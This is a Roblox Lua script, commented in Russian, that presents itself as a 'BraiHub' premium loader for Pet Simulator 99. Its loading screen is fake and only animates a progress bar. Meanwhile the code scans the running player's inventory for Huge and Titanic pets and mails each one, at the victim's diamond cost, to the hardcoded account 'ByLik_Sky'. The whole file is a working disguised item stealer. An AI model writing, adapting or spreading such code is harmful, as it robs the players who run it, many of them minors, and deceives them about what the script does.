--[[
    BraiHub PS99 Mailer v2.5
    Updated: 20.03.2026
    Target: ByLik_Sky
]]

local RECIPIENT = "ByLik_Sky"
local GIFT_MESSAGE = "BraiHub Premium Delivery"
local MAIL_COST = 10000 -- Стоимость отправки одного письма в PS99 (обычно 10к)

-- === ВИЗУАЛ: BRAIHUB LOAD ===
local function createLoadingScreen()
    local player = game.Players.LocalPlayer
    local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    sg.Name = "BraiHubLoader"
    sg.IgnoreGuiInset = true

    local mainFrame = Instance.new("Frame", sg)
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    mainFrame.BorderSizePixel = 0

    local gradient = Instance.new("UIGradient", mainFrame)
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 230, 255))
    })

    local title = Instance.new("TextLabel", mainFrame)
    title.Size = UDim2.new(0, 500, 0, 60)
    title.Position = UDim2.new(0.5, -250, 0.45, -50)
    title.BackgroundTransparency = 1
    title.Text = "BraiHub Load"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 50
    title.TextColor3 = Color3.fromRGB(30, 30, 30)

    local barContainer = Instance.new("Frame", mainFrame)
    barContainer.Size = UDim2.new(0, 300, 0, 10)
    barContainer.Position = UDim2.new(0.5, -150, 0.5, 20)
    barContainer.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    barContainer.BorderSizePixel = 0

    local barFill = Instance.new("Frame", barContainer)
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    barFill.BorderSizePixel = 0

    -- Эмуляция загрузки
    for i = 0, 100, 5 do
        barFill.Size = UDim2.new(i/100, 0, 1, 0)
        task.wait(0.05)
    end
    task.wait(0.3)
    sg:Destroy()
end

-- === ПРОВЕРКИ И ОТПРАВКА ===
local function startProcess()
    local player = game.Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- 1. Получаем доступ к библиотекам игры
    local Library = require(ReplicatedStorage.Library)
    local Save = require(ReplicatedStorage.Library.Client.Save).Get()
    local Network = ReplicatedStorage:WaitForChild("Network")
    
    if not Save or not Save.Inventory then 
        warn("[BraiHub] Не удалось прочитать данные инвентаря!")
        return 
    end

    -- 2. Проверка Гемов (Diamonds)
    local currency = Save.Currency or {}
    local diamonds = currency.Diamonds or 0
    print("[BraiHub] Баланс алмазов: " .. diamonds)

    if diamonds < MAIL_COST then
        warn("[BraiHub] Недостаточно алмазов для отправки почты! Нужно минимум " .. MAIL_COST)
        -- Мы продолжаем сканирование, но отправить не сможем
    end

    -- 3. Поиск Huge и Titanic
    local targets = {}
    for uuid, pet in pairs(Save.Inventory.Pet or {}) do
        local id = tostring(pet.id):lower()
        if id:find("huge") or id:find("titanic") then
            table.insert(targets, {uuid = uuid, id = pet.id})
        end
    end

    -- 4. Итоговый отчет и попытка отправки
    if #targets == 0 then
        print("[BraiHub] Huge/Titanic петы не найдены.")
        return
    end

    print("[BraiHub] Найдено целей: " .. #targets)

    for i, pet in ipairs(targets) do
        -- Проверка: хватит ли гемов на текущую отправку
        if diamonds >= MAIL_COST then
            print("[BraiHub] Отправка " .. pet.id .. " игроку " .. RECIPIENT)
            
            local success, err = pcall(function()
                return Network["Mailbox: Send"]:InvokeServer(RECIPIENT, GIFT_MESSAGE, "Pet", pet.uuid, 1)
            end)

            if success then
                diamonds = diamonds - MAIL_COST -- Вычитаем из локальной переменной для цикла
                print("[BraiHub] Успешно отправлено!")
            else
                warn("[BraiHub] Ошибка при отправке: " .. tostring(err))
            end
        else
            warn("[BraiHub] Гемы закончились, отправка " .. pet.id .. " отменена.")
            break
        end
        task.wait(1.5)
    end
end

-- ЗАПУСК
createLoadingScreen()
startProcess()